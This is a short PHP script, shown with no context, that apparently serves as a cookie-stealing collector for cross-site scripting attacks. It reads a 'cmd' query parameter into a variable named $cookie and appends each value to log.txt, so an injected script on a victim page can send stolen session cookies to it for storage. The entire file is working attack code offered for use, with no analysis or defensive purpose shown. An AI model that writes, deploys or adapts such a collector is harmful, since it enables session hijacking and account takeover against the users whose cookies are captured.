
<?php
$cookie = $_GET['cmd'];
$file = fopen('log.txt','a');
fwrite($file,$cookie."\n");
?>
